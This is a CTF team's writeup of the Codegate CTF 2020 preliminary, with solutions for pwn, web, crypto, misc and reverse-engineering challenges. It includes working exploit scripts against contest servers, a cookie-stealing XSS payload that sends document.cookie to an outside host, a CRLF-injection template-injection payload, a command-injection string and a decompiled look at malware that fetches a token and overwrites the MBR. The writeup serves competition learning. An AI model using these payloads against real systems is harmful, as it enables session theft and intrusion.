# Codegate CTF 2020 Preliminary

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200208-codegatectf2020quals/) of this writeup.**


 - [Codegate CTF 2020 Preliminary](#codegate-ctf-2020-preliminary)
 - [Codegate CTF 2020 Preliminary](#codegate-ctf-2020-preliminary-1)
   - [Pwn](#pwn)
     - [Babyllvm](#babyllvm)
   - [Web](#web)
     - [CSP](#csp)
       - [Train of Thought](#train-of-thought)
       - [Failed Attempts](#failed-attempts)
     - [renderer](#renderer)
       - [Train of Thought](#train-of-thought-1)
   - [Crypto](#crypto)
     - [Halffeed](#halffeed)
     - [Munch](#munch)
     - [Polynomial](#polynomial)
   - [Misc](#misc)
     - [Verifier](#verifier)
   - [Rev](#rev)
     - [ORM-APP](#orm-app)
       - [Reverse the emulator](#reverse-the-emulator)
       - [Exploit the program](#exploit-the-program)
     - [malicious](#malicious)


---

# Codegate CTF 2020 Preliminary

## Pwn

### Babyllvm
When rel_pos == 0, is_safe always return True. We can modify data_ptr in one block and read/write in another block to bypass bounding check getting arbitrary read/write. Leak libc address and hijack GOT to control PC and get shell.
```python=
from pwn import *

#r = remote("localhost",4444)
r = remote("58.229.240.181", 7777)
payload = ",[]<<<<<<<<[-]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<.>.>.>.>.>.>.>.>,>,>,>,>,>,>,>,>"
r.sendlineafter(">>>",payload)
r.recvrepeat(1)
r.send("\x00")
libc = u64(r.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x110070
print hex(libc)
r.send(p64(libc+0x10a38c))
r.sendlineafter(">>>","<-")
r.interactive()
```

## Web

### CSP


The objective is to steal admin's cookie. We are given the source code:

```php
<!DOCTYPE html>
<html>
  <head>
    <title>Advanced Echo Service</title>
  </head>
  <body>
    <!-- TODO: implement form to support multiple APIs in same time -->
    <form action="view.php" method="GET">
      <p>API Name (Required): </p>
      <input name="name" type="text" required /> 
      <p>API Param#1 (Optional) : </p>
      <input name="p1" type="text" />
      <p>API Param#2 (Optional) : </p>
      <input name="p2" type="text" />
      <button type="submit">Submit</button>
    </form>
    <br />
    <p>
      If you find a bug, please <a href="/report.php">report</a>!
    </p>
  </body>
</html>
```

```php
<?php
require_once 'config.php';

if(!isset($_GET["q"]) || !isset($_GET["sig"])) {
    die("?");
}

$api_string = base64_decode($_GET["q"]);
$sig = $_GET["sig"];

if(md5($salt.$api_string) !== $sig){
    die("??");
}

//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...
$apis = explode("|", $api_string);
foreach($apis as $s) {
    $info = explode(",", $s);
    if(count($info) != 3)
        continue;
    $n = base64_decode($info[0]);
    $p1 = base64_decode($info[1]);
    $p2 = base64_decode($info[2]);

    if ($n === "header") {
        if(strlen($p1) > 10)
            continue;
        if(strpos($p1.$p2, ":") !== false || strpos($p1.$p2, "-") !== false) //Don't trick...
            continue;
        header("$p1: $p2");
    }
    elseif ($n === "cookie") {
        setcookie($p1, $p2);
    }
    elseif ($n === "body") {
        if(preg_match("/<.*>/", $p1))
            continue;
        echo $p1;
        echo "\n<br />\n";
    }
    elseif ($n === "hello") {
        echo "Hello, World!\n";
    }
}
```

Also, the CSP `default-src 'self'; script-src 'none'; base-uri 'none';` is very strict. It's too difficult to execute javascript with that constraint. Therefore, the idea here is to abuse `header` or `setcookie` to somehow strip out this CSP.

But `header` here has some limitations: the key length and some chacracter like `:-` are not allowed. It's too hard to do any tricks here.

Let's check [header()'s doc](https://www.php.net/manual/en/function.header.php) first.

>  There are two special-case header calls. The first is a header that starts with the string "HTTP/" (case is not significant), which will be used to figure out the HTTP status code to send....

That is cool, so we can probably manipulate the response code. After a few tries, we accidently found some status code (103, 123, 300 ...) will lead to no CSP at all. This is due to [nginx's behavior](https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header). You can see read [our discussion here on twitter](https://twitter.com/stereotype32/status/1226316682227900416). The community is just amazing!

Next, we have to bypass the `preg_match("/<.*>/", $p1)` filter. This one is simple as we can inject newline before the `>`.

The last one is the md5 length extension attack. Since the API only provides signature for one single command, we have to extend it to  two commands (header and body). The part is done by @nkhg :)

Here is the full payload. I don't know why `fetch` won't work in remote headless Chrome, so I use `<img>` instead.

```python
#!/usr/bin/env python3                                                                                                                                                                         
import requests, hashlib, re, base64

import base64
import hashpumpy

def b64e(s):
    return base64.b64encode(s.encode()).decode()

def b64d(s):
    return base64.b64decode(s.encode())

s = requests.session()

target = '|' + ','.join([
    b64e('header'),
    b64e('HTTP/1.1'),
    b64e('300'),
]) + '|' + ','.join([
    b64e('body'),
    b64e('<img id="img"\n></img\n><script\n>document.getElementById("img").src="//255.255.255.255:13337/?"+document.cookie;</script\n>'),
    b64e('dontCare')
])
tmp = target.encode('ascii')
print(tmp)
for i in range(12, 13):
  #r = hashpumpy.hashpump('f43646db31566ccb3f624f46aac80b53', ',,YQ==', tmp, i)
  r = hashpumpy.hashpump('7f104404b0d414d18ab3efb831e333d7', ',,', tmp, i)
  t = base64.b64encode(r[1])
  #print(t)
  #print(i, r)
  p = s.get('http://110.10.147.166/api.php', params=dict(sig=r[0], q=t))
  print(p.url)
  if p.content != b'??':
    print('solved!')
    print(t, r[0])
    print(p.status_code)
    for k, v in p.headers.items():
        print(k, ':', v)
    print(p.content)
    break
```

#### Train of Thought

1. Find out the most exploitable path here: `setcookie` and `header` to strip out CSP.
2. Know that the `header` can be used to control HTTP status code by reading the document.
3. Do some random testing (fuzzing) to see if we can manipulate the headers.

#### Failed Attempts

1. CRLF injection: `header` seems to be vulnerable to this [in 2002](https://securiteam.com/unixfocus/5zp022a8aw/). In the latest PHP, both `setbookie` and `header` will filter out invalid characters.
2. Bypass PHP length check and `strpos`: I can't come out with an approach to bypass that.
3. DNS rebinding: Not useful when dealing with cookies because of the incorrect domains.


### renderer

In this challenge we only have the Dockerfile. Those python and shell script are not included in the given source code.

```
FROM python:2.7.16

ENV FLAG CODEGATE2020{**DELETED**}

RUN apt-get update
RUN apt-get install -y nginx
RUN pip install flask uwsgi

ADD prob_src/src /home/src
ADD settings/nginx-flask.conf /tmp/nginx-flask.conf

ADD prob_src/static /home/static
RUN chmod 777 /home/static

RUN mkdir /home/tickets
RUN chmod 777 /home/tickets

ADD settings/run.sh /home/run.sh
RUN chmod +x /home/run.sh

ADD settings/cleaner.sh /home/cleaner.sh
RUN chmod +x /home/cleaner.sh

CMD ["/bin/bash", "/home/run.sh"]
```

So we need to do some obnoxious black-box tricks here :/

The server is a proxy service with `Python-urllib/2.7`, based on Flask + uswgi. The can issue `GET` reuqest to an arbitrary endpoint. After some black-box fuzzing, we found an endpoint route `http://127.0.0.1/renderer/admin`. There is a link on that admin page `/static/img/admin.jpg`.

However, visiting the link will get a 404 not found **by nginx**. This is kind of strange because by default `/static` should be handle by [Flask itself](https://flask.palletsprojects.com/en/1.1.x/tutorial/static/).

And there is a nginx path traversal bug, which allows us to get the source of the remote server. For this bug you can read [this article (in English)](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) or [this one (in Simplified Chinese)](https://www.leavesongs.com/penetration/nginx-insecure-configuration.html#_1). This bug requires some guessing in my opinion, so if you fail to do this, don't blame yourself. The author should attach the nginx config file in the given source code, rather than asking challenger to guess something here.

It's worth to mention that this is probaby the 5th of 6th times I encounter this bug in 2019 and 2020's CTF ......

We have the full sourcde code by inferring the filepath from the `uswgi.ini` and `run.py`:

```python
from flask import Flask, render_template, render_template_string, request, redirect, abort, Blueprint
import urllib2
import time
import hashlib

from os import path
from urlparse import urlparse

front = Blueprint("renderer", __name__)

@front.before_request
def test():
    print(request.url)

@front.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    
    url = request.form.get("url")
    res = proxy_read(url) if url else False
    if not res:
        abort(400)

    return render_template("index.html", data = res)

@front.route("/whatismyip", methods=["GET"])
def ipcheck():
    return render_template("ip.html", ip = get_ip(), real_ip = get_real_ip())

@front.route("/admin", methods=["GET"])
def admin_access():
    ip = get_ip()
    rip = get_real_ip()

    if ip not in ["127.0.0.1", "127.0.0.2"]: #super private ip :)
        abort(403)

    if ip != rip: #if use proxy
        ticket = write_log(rip)
        return render_template("admin_remote.html", ticket = ticket)

    else:
        if ip == "127.0.0.2" and request.args.get("body"):
            ticket = write_extend_log(rip, request.args.get("body"))
            return render_template("admin_local.html", ticket = ticket)
        else:
            return render_template("admin_local.html", ticket = None)

@front.route("/admin/ticket", methods=["GET"])
def admin_ticket():
    ip = get_ip()
    rip = get_real_ip()

    if ip != rip: #proxy doesn't allow to show ticket
        print 1
        abort(403)
    if ip not in ["127.0.0.1", "127.0.0.2"]: #only local
        print 2
        abort(403)
    if request.headers.get("User-Agent") != "AdminBrowser/1.337":
        print request.headers.get("User-Agent")
        abort(403)
    
    if request.args.get("ticket"):
        log = read_log(request.args.get("ticket"))
        if not log:
            print 4
            abort(403)
        return render_template_string(log)

def get_ip():
    return request.remote_addr

def get_real_ip():
    return request.headers.get("X-Forwarded-For") or get_ip()

def proxy_read(url):
    #TODO : implement logging
    
    s = urlparse(url).scheme
    if s not in ["http", "https"]: #sjgdmfRk akfRk
        return ""

    return urllib2.urlopen(url).read()

def write_log(rip):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        log_str = "Admin page accessed from %s" % rip
        f.write(log_str)
    
    return tid

def write_extend_log(rip, body):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        f.write(body)

    return tid

def read_log(ticket):
    if not (ticket and ticket.isalnum()):
        return False
    
    if path.exists("/home/tickets/%s" % ticket):
        with open("/home/tickets/%s" % ticket, "r") as f:
            return f.read()
    else:
        return False
```

I don't know what `write_extend_log`, `127.0.0.2`, `admin_local` are used for. Anyway:

1. The objective is `render_template_string` to RCE / read `config` because the flag is in `config`
2. `get_real_ip` will get the IP address from a user-controlled HTTP header `X-Forwarded-For`
3. Accourding to `Dockerfile`, this python urllib is vulnerable to [CRLF injection](https://bugs.python.org/issue36276).

The first `renderer/admin` should be easy to do. The real problem is the second `user-agent` one, because `urllib2` will also append its `user-agent` in the HTTP header. I was trying to inject `\r\n\r\n` to make the header become part of the HTTP body part, but nginx considers that's an invalid request and thus reply with HTTP 400.

After more fuzzing, I found HTTP version is somehow related to this behavior. Injecting `\r\n\r\n` in HTTP/1.1 does not work for me, however to my surprise, HTTP/1.0 seems to work well here. The reason seems to be related to the `Host:` header. In order to make it work in HTTP/1.1, [you need to inject `Host: 127.0.0.1\r\n`](https://github.com/empty-jack/ctf-writeups/blob/master/CodeGate-2020/web-renderer.md). I don't know if the root cause is RFC or nginx. Please let me know by creating a GitHub issue if you have anything in your mind. with HTTP/1.1. Not really sure how nginx parses these chaotic headers.

Btw, HTTP version trick also appears in [Plaid CTF 2019](https://blog.pspaul.de/posts/plaidctf-2019-potent-quotables/).

Here is my final payload:

```python
#!/usr/bin/env python3                                                                                                                   
import requests
import re

s = requests.session()

url = 'http://127.0.0.1/renderer/admin HTTP/1.1\r\nX-Forwarded-For:{{config}}YOLOzzw\r\n'
r = s.post('http://58.229.253.144/renderer/', data=dict(url=url))
print(r.text)
tid = re.findall('([0-9a-f]{40})', r.text)[0]

url = f'http://127.0.0.1/renderer/admin/ticket?ticket={tid} HTTP/1.0\r\nUser-agent: AdminBrowser/1.337\r\n\r\nA:'
r = s.post('http://58.229.253.144/renderer/', data=dict(url=url))
print(r.text, r.status_code)
```

#### Train of Thought

1. Guessing the nginx path traversal trick to retrieve the source code
2. Find out the Python version is vulnerable to HTTP header injection by virtual of CRLF injection

## Crypto

### Halffeed

```python=
pt = b'\x00'*11 + b';cat ' + b'a'*16
ct1, _ = get_enc(pt)
t1 = sxor(ct1[16:], pt[16:])

pt = b'flag;' + b'd'*11
t2, ct2 = feed_plus(t1, pt)

pt = b'b'*16 + b'e'*16
ct, _ = get_enc(pt)
t3 = sxor(ct[16:], pt[16:])

pt = b'b'*16 + sxor(t2[:8], t3[:8]) + b'd'*8
_, tag = get_enc(pt)

ct = ct1[:16] + ct2
do_exec(0, ct, tag)

# CODEGATE2020{F33D1NG_0N1Y_H4LF_BL0CK_W1TH_BL0CK_C1PH3R}
```

### Munch
In this task, We have an encrypted flag with RSA and some info about one of its prime `p`:
1. The prime `p` is split into 7 parts:
    * [74bits] [35bits] [111bits] [35bits] [111bits] [35bits] [111bits]
2. Remove those 35bits parts
3. We can get 52bits of MSBs of `y = part[i] * seed**(16 * k) mod m`, where k starts from 0 to 50, and we know what the seed is.

We can reconstruct those parts with LLL algorithm. Consider following matrix:
```
M = [diag(seed^(16*k))   diag(y<<shift)   I   m*I]
```
we know that:
```
M * [part[i]    -1    truncated_LSBs    modulo_parts] = 0
```
And we can find that vector by finding reduction basis on the right kernel of M.

After we got those bits of prime p, we can reconstruct those missing 35bit parts using [multivariate coppersmith](https://gist.github.com/jhs7jhs/0c26e83bb37866f5c7c6b8918a854333).
### Polynomial
The encryption algorithm is NTRU, and we can find some attacks of insecure parameters from its original paper. The weaker one can be solved by applying LLL on public key to find private key, but it doesn't work on the stronger one. To solve both of them, I use another attack by ciphertext to recover plaintext directly. Consider the following lattice:
```
H = Matrix(ZZ, h.matrix())
C = Matrix(ZZ, [outputs.list()])
I, O = identity_matrix, zero_matrix
nr, nc = H.nrows(), H.ncols()
L = Matrix.block([
    [a * I(nr, nc),      H        ],
    [    O(nr, nc),  q * I(nr, nc)],
    [    O(1,  nc),      C        ],
])
```

`(ar, m)` is in the lattice, and we can find it with LLL algorithm.

## Misc

### Verifier

```=
i = 0;
j = 0;
ans = 3;
[ i < 10 { j = j + 1 ; j > 6 ? { ans = ans - 1 ; i = i + 1 } : { i = i + 1 } } ];
!ans
```

## Rev
### ORM-APP
#### Reverse the emulator
We have a binary of emulator and a special ISA binary. The code structure of emulator is quite simple. It just need a lot of human effort to figure out the definition of opcodes.
```c
__int64 __fastcall main(__int64 a1, char **argv, char **a3)
{
  task cpu; // [rsp+10h] [rbp-40h]
  unsigned __int64 v5; // [rsp+48h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (signed int)a1 <= 1 )
    usage((__int64)*argv);
  unbuffering();
  load(argv[1], &cpu);
  if ( !cpu.bin_info )
  {
    fwrite("fatal: fail to initialize ORM.\n", 1uLL, 0x1FuLL, stderr);
    exit(-1);
  }
  run_emu(&cpu);
  return 0LL;
}

void __fastcall run_emu(task *cpu)
{
  while ( !(unsigned int)run(cpu) )
    ;
  switch ( -cpu->errno )
  {
    case 0:
      fwrite("ORM halted.\n", 1uLL, 0xCuLL, stderr);
      exit(0);
      return;
    case 1:
      fwrite("Invalid opcode.\n", 1uLL, 0x10uLL, stderr);
      break;
    case 2:
      fwrite("Segmentation fault.\n", 1uLL, 0x14uLL, stderr);
      break;
    case 3:
      fwrite("Invalid State.\n", 1uLL, 0xFuLL, stderr);
      break;
    case 4:
      fwrite("Device error.\n", 1uLL, 0xEuLL, stderr);
      break;
  }
  exit(-1);
}

__int64 __fastcall run(task *cpu)
{
  int v1; // eax
  unsigned __int8 opcode; // [rsp+1Fh] [rbp-1h]

  opcode = get_data(cpu);
  v1 = cpu->x64_x32;
  if ( v1 == 4 )
    return operation_32[opcode >> 3](cpu, (opcode >> 2) & 1, opcode & 3);
  if ( v1 == 8 )
    return operation_64[opcode >> 3](cpu, (opcode >> 2) & 1, opcode & 3);
  cpu->errno = -3;
  return 1LL;
}

.data:0000000000213120 ; __int64 (__fastcall *operation_64[32])(task *task, char flag, unsigned __int8 a3)
.data:0000000000213120 operation_64    dq offset nop           ; DATA XREF: run+89↑o
.data:0000000000213120                                         ; run+90↑r
.data:0000000000213120                 dq offset push
.data:0000000000213120                 dq offset pop
.data:0000000000213120                 dq offset neg
.data:0000000000213120                 dq offset add
.data:0000000000213120                 dq offset sub
.data:0000000000213120                 dq offset mul
.data:0000000000213120                 dq offset div
.data:0000000000213120                 dq offset mod
.data:0000000000213120                 dq offset unsign_rshift
.data:0000000000213120                 dq offset sign_rshift
.data:0000000000213120                 dq offset lshift
.data:0000000000213120                 dq offset and
.data:0000000000213120                 dq offset or
.data:0000000000213120                 dq offset xor
.data:0000000000213120                 dq offset equl
.data:0000000000213120                 dq offset nequl
.data:0000000000213120                 dq offset unsign_b
.data:0000000000213120                 dq offset unsign_beq
.data:0000000000213120                 dq offset sign_b
.data:0000000000213120                 dq offset sign_beq
.data:0000000000213120                 dq offset jmp
.data:0000000000213120                 dq offset jz
.data:0000000000213120                 dq offset jnz
.data:0000000000213120                 dq offset set_adr
.data:0000000000213120                 dq offset sub_E298
.data:0000000000213120                 dq offset call
.data:0000000000213120                 dq offset write_mem
.data:0000000000213120                 dq offset write_reg
.data:0000000000213120                 dq offset read_mem
.data:0000000000213120                 dq offset set_err
.data:0000000000213120                 dq offset set_err
```

#### Exploit the program
After we get the definition of opcodes, we write a loader and processor module to reverse the challenge program in IDA. The disassembler is far from perfect, but we can guess about what the program wants to do from its structure.

It's main function is quite simple, it is just a switch on input and call corresponding routine based on our input:
![](https://i.imgur.com/zYvLSIU.png)

First of all, Let's find where the flag-related parts are:
```
SEG3:90909090909091A8 aMigratingCenso:db "[+] Migrating ====== CENSORED: FLAG LOCATED HERE. ======"
```
![](https://i.imgur.com/eVNOkmK.png)
```
write(1, aMigratingCenso, 0xE);
```
The length specified won't print the flag out in normal case, so we need to find some vulnerability to leak that memory.


The first bug we found is from `add` routine:
![](https://i.imgur.com/68wL4nV.png)
It won't check about how many projects is created, and it will overflow:
![](https://i.imgur.com/Ld4IzCo.png)
The memory layout looks like:
```
SEG4:A0A0A0A0A0A0A000 ; Segment type: Pure data
SEG4:A0A0A0A0A0A0A000 input:          dq 0                    ; DATA XREF: show+2E↑r
SEG4:A0A0A0A0A0A0A000                                         ; show+49↑r ...
SEG4:A0A0A0A0A0A0A008                 align 0x1000
SEG4:A0A0A0A0A0A0B000 project_count:  dq 0                    ; DATA XREF: get_project+4↑r
SEG4:A0A0A0A0A0A0B000                                         ; add+1↑r ...
SEG4:A0A0A0A0A0A0B008 projects:       dq 8 dup(0)             ; DATA XREF: get_project+1A↑r
SEG4:A0A0A0A0A0A0B008                                         ; add+26↑r ...
SEG4:A0A0A0A0A0A0B048 data:           dq 0                    ; DATA XREF: add+3B↑r
SEG4:A0A0A0A0A0A0B048                                         ; migrate+D9↑r
SEG4:A0A0A0A0A0A0B050                 align 0x1000
SEG4:A0A0A0A0A0A0B050 ; end of 'SEG4'
SEG4:A0A0A0A0A0A0B050
```

`projects` is a pointer array points to its corresponding data. And data is an array of following structure:
```
char     name[8];
char     description[0x80];
uint64_t is_migrated;
```

So after overflow, the name of first project will be overwritten we some address, and it makes the string longer because the null byte is overwritten.

The second bug we found is that the program will segfault when we call migrate on overflowed project. We tried to hook on the emulator to figure out which instruction causing the segfault. Surprisingly, the reason is that program counter is in non executable data segment.
We find the root cause is `strcpy` in `migrate` which overflow the stack.
![](https://i.imgur.com/iDqg69r.png)

Now, the path to our flag is clear: change the return address to flag printing gadget and win :)

here is the exploit:

```python=
from pwn import *
 
p = remote("110.10.147.39",31337)
def Add(name, des):
    p.sendafter(b">>> ",b'A')
    p.sendafter(b"):", name)
    p.sendafter(b"):", des)
 
Add(b'0',p64(0x80808080808084B6))
for _ in range(7):
    Add(b'0',b'trash')

p.sendafter(b">>> ",b'M')
p.sendafter(b":",b'0')
p.sendafter(b":","trash")                                                                             
flag = p.recvuntil(b"\x00")
print(flag)
```

### malicious

Looks very simple, the function at `0x403ED2` is useless, patch it.
And the function at `0x403f8c` connect to an HTTP server on 195.157.15.100:818 to ask for a token, the token would be used as the first argument to call md5 function, which's not just a hash function, it would also affect the result of the shellcode in the next step. The md5 result should be `d4ee0fbbeb7ffd4fd7a7d477a7ecd922` which is the md5 result of `activate`.

Then in the function at `0x403DB1`, it would decrypt the shellcode which was encrypted by camellia or something, that's not important, the result only affect by the token in the last step. 


```c
int sub_403F8C()
{
  struct sockaddr name; // [esp+18h] [ebp-1B0h]
  struct WSAData WSAData; // [esp+28h] [ebp-1A0h]
  void *Buf1; // [esp+1B8h] [ebp-10h]
  SOCKET s; // [esp+1BCh] [ebp-Ch]

  WSAStartup(0x202u, &WSAData);
  s = socket(2, 1, 0);
  memset(&name, 0, 0x10u);
  name.sa_family = 2;
  *(_DWORD *)&name.sa_data[2] = inet_addr("195.157.15.100");
  *(_WORD *)name.sa_data = htons(0x332Cu);
  if ( connect(s, &name, 16) )
    return 0;
  send(s, "GET /status HTTP/1.1\r\n", 22, 0);
  recv(s, token, 8, 0);
  Buf1 = md5(token, 8u);
  return memcmp(Buf1, &md5_hash, 0x10u);
}
```

The decrypted shellcode is an MBR (the program base is `0x7c00`), it would copy itself to `0x600`, decrypt itself by xor `0xF4`, then jump to the `0x630`.

Then the MBR use BIOS interrupt call 0x1A to get the current time, the value of `cx:dx` looks like `0x2020:0x0208` , the MBR check the year should be greater or equal to `0x30` or it would print out `Not a chance`.

After that check, there is a loop :

```
for di in range(0xdead):
    for si in range(0xbeef):
        write sectors [1:32] on disk to memory 0x1000
        concat sector [0] on disk after that (0x5000, a sector is 0x200)
        overwrite the sectors[0:32] on disk with memory start from 0x1000

extract the bytes of flag on each sector and print out 
```

Illustrate the sectors after each loop:

```
#1
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0]
#2
[2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1]
#3
[3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2]
```

Modifying the `di` as 1 and `si` as `(0xdead*0xbeef)%33` then we get the flag:

`CODEGATE2020{8_bits_per_byte_1_byte_per_sector}`
